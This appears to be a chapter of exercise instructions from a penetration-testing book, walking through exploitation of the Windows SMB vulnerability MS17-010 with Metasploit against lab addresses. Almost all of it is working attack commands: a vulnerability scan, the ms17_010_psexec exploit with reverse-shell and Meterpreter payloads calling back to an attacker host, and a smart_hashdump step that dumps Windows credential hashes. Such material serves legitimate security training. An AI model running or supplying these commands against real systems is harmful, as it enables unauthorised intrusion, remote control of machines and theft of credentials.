# Chapter 7 Instructions

## Exploiting Windows SMB Vulnerability with MS17-010

Setup and Verification
Open the Metasploit framework:

```
msfconsole
```

### Listing 7.1 Verifying the target is exploitable

Use the auxiliary scanner for SMB MS17-010:

```
msf5 > use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 10.0.10.227
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
```

### Listing 7.2 Checking for the localhost IP address

Confirm the localhost IP address:

```
msf5 auxiliary(scanner/smb/smb_ms17_010) > ifconfig
```

### Listing 7.3 Using the MS17-010 exploit module

Use the MS17-010 exploit module:

```
msf5 > use exploit/windows/smb/ms17_010_psexec
msf5 exploit(windows/smb/ms17_010_psexec) > set rhost 10.0.10.208
msf5 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/shell/reverse_tcp
msf5 exploit(windows/smb/ms17_010_psexec) > set lhost 10.0.10.160
msf5 exploit(windows/smb/ms17_010_psexec) > exploit
```

### Listing 7.4 Getting a Meterpreter shell

Utilize Meterpreter payload:

```
msf5 > use exploit/windows/smb/ms17_010_psexec
msf5 exploit(windows/smb/ms17_010_psexec) > set rhost 10.0.10.208
msf5 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/meterpreter/reverse_https
msf5 exploit(windows/smb/ms17_010_psexec) > exploit
```

### Listing 7.5 The Meterpreter help screen

Access Meterpreter shell:

```
meterpreter > help
```

### Listing 7.7 Using the smart_hashdump post module

```
meterpreter > run post/windows/gather/smart_hashdump
```
